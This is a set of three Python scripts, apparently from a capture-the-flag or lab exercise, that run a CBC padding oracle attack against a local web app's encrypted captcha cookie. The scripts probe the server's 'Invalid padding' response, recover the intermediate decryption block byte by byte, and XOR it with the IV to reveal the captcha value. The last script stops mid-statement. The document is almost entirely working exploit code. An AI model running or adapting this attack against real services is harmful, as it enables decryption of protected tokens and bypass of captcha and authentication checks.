import requests
import base64
import re

base_url = "http://127.0.0.1:33002"
BLOCK_SIZE = 16

def test_oracle(session, modified_captcha_b64, csrf_token):
    """
    Returns True if padding is valid, False if "Invalid padding"
    """
    session.cookies.set('captcha', modified_captcha_b64, domain='127.0.0.1', path='/')
    
    data = {
        'csrf_token': csrf_token,
        'username': 'oracle_test',
        'captcha': '12345',
        'submit': 'Create User'
    }
    
    try:
        resp = session.post(f"{base_url}/", data=data, allow_redirects=True)
        if "Invalid padding" in resp.text:
            return False  # Invalid padding
        return True  # Valid padding
    except:
        return None

# Get CSRF token
session = requests.Session()
resp = session.get(f"{base_url}/")
csrf_match = re.search(r'name="csrf_token"[^>]*value="([^"]+)"', resp.text)
csrf_token = csrf_match.group(1) if csrf_match else ""

# Use the provided captcha
captcha_b64 = "hWlOzGJIEXjbBbkpSz/JN6UCPymOe4OA6y9SOuLnis0="
ciphertext = base64.b64decode(captcha_b64)
i0 = bytearray(ciphertext[:BLOCK_SIZE])  # IV
i1 = bytearray(ciphertext[BLOCK_SIZE:])  # Block 1

print(f"[*] Testing all 256 values for last byte...")

# Test what happens when we just flip bits in the last byte of IV
counts = {'valid': [], 'invalid': []}

for test_byte in range(256):
    c0 = bytearray(i0)
    c0[15] = test_byte  # Just set the last byte directly
    
    modified_cipher = bytes(c0) + bytes(i1)
    modified_b64 = base64.b64encode(modified_cipher).decode()
    
    result = test_oracle(session, modified_b64, csrf_token)
    
    if result:
        counts['valid'].append(test_byte)
    else:
        counts['invalid'].append(test_byte)

print(f"Valid padding count: {len(counts['valid'])}")
print(f"Invalid padding count: {len(counts['invalid'])}")
print(f"Valid bytes: {counts['valid']}")
print(f"Invalid bytes: {counts['invalid'][:20]}... (showing first 20)")

# This will tell us what IV values produce valid padding
# Decrypt(C1)[15] XOR IV[15] = plaintext_byte
# We want to find original_P1[15]


import requests
import base64
import re

base_url = "http://127.0.0.1:33002"
BLOCK_SIZE = 16

def test_oracle(session, modified_captcha_b64, csrf_token):
    """
    Returns True if padding is valid (NOT "Invalid padding"), False otherwise
    """
    session.cookies.set('captcha', modified_captcha_b64, domain='127.0.0.1', path='/')
    
    data = {
        'csrf_token': csrf_token,
        'username': 'oracle_test',
        'captcha': '12345',
        'submit': 'Create User'
    }
    
    try:
        resp = session.post(f"{base_url}/", data=data, allow_redirects=True)
        if "Invalid padding" in resp.text:
            return False
        return True
    except:
        return None

# Get CSRF token
session = requests.Session()
resp = session.get(f"{base_url}/")
csrf_match = re.search(r'name="csrf_token"[^>]*value="([^"]+)"', resp.text)
csrf_token = csrf_match.group(1) if csrf_match else ""

# Use the provided captcha
captcha_b64 = "hWlOzGJIEXjbBbkpSz/JN6UCPymOe4OA6y9SOuLnis0="
ciphertext = base64.b64decode(captcha_b64)

# Split ciphertext
IV = bytearray(ciphertext[:BLOCK_SIZE])
C1 = bytearray(ciphertext[BLOCK_SIZE:2*BLOCK_SIZE])

print(f"[*] IV: {IV.hex()}")
print(f"[*] C1: {C1.hex()}")

# Padding Oracle Attack - Byte by Byte
INT1 = bytearray(BLOCK_SIZE)  # Intermediate values Decrypt(C1)
P1 = bytearray(BLOCK_SIZE)    # Plaintext

for byte_pos in range(BLOCK_SIZE - 1, -1, -1):
    pad_val = BLOCK_SIZE - byte_pos  # Expected padding value
    
    print(f"\n[*] Attacking byte {byte_pos} (pad=0x{pad_val:02x})")
    
    # Try all 256 values for this IV byte
    for test_val in range(256):
        # Create test IV
        test_IV = bytearray(IV)
        test_IV[byte_pos] = test_val
        
        # For already processed bytes, set them for valid padding
        for i in range(byte_pos + 1, BLOCK_SIZE):
            test_IV[i] = INT1[i] ^ pad_val
        
        # Test
        test_cipher = bytes(test_IV) + bytes(C1)
        test_b64 = base64.b64encode(test_cipher).decode()
        
        if test_oracle(session, test_b64, csrf_token):
            # Found valid padding
            INT1[byte_pos] = test_val ^ pad_val
            P1[byte_pos] = IV[byte_pos] ^ INT1[byte_pos]
            print(f"  [+] IV[{byte_pos}]={test_val} -> INT1[{byte_pos}]=0x{INT1[byte_pos]:02x} -> P1[{byte_pos}]='{chr(P1[byte_pos])}'")
            break

print(f"\n[+] Decryption complete!")
print(f"[+] Intermediate block: {INT1.hex()}")
print(f"[+] Plaintext (hex): {P1.hex()}")
print(f"[+] Plaintext (bytes): {bytes(P1)}")
print(f"[+] Plaintext: {P1.decode('latin-1')}")


import requests
import base64
import re

base_url = "http://127.0.0.1:33002"
BLOCK_SIZE = 16

def test_oracle(session, modified_captcha_b64, csrf_token):
    """
    Returns True if padding is valid (NOT "Invalid padding"), False otherwise
    """
    session.cookies.set('captcha', modified_captcha_b64, domain='127.0.0.1', path='/')
    
    data = {
        'csrf_token': csrf_token,
        'username': 'oracle_test',
        'captcha': '12345',
        'submit': 'Create User'
    }
    
    try:
        resp = session.post(f"{base_url}/", data=data, allow_redirects=True)
        if "Invalid padding" in resp.text:
            return False
        return True
    except:
        return None

# Get CSRF token
session = requests.Session()
resp = session.get(f"{base_url}/")
csrf_match = re.search(r'name="csrf_token"[^>]*value="([^"]+)"', resp.text)
csrf_token = csrf_match.group(1) if csrf_match else ""

# Use the provided captcha
captcha_b64 = "hWlOzGJIEXjbBbkpSz/JN6UCPymOe4OA6y9SOuLnis0="
ciphertext = base64.b64decode(captcha_b64)

# Blocks
IV = bytearray(ciphertext[:BLOCK_SIZE])
C1 = bytes(ciphertext[BLOCK_SIZE:])

# Extracted intermediate block from previous run
INT1 = bytes.fromhex("c73e7783200a213483528b180c72cb35")

# Calculate plaintext: P = IV XOR Decrypt(C) = IV XOR INT1
P1 = bytes(a ^ b for a, b in zip(IV, INT1))
print(f"[+] Plaintext (hex): {P1.hex()}")
print(f"[+] Plaintext (all): {P1}")

# Remove PKCS#7 padding
pad_len = P1[-1]
if 1 <= pad_len <= BLOCK_SIZE and P1[-pad_len:] == bytes([pad_len] * pad_len):
    plaintext_no_pad = P1[:-pad_len]
    print(f"[+] Pad length: {pad_len}")
    print(f"[+] Captcha value: {plaintext_no_pad.decode('latin-1')}")
else:
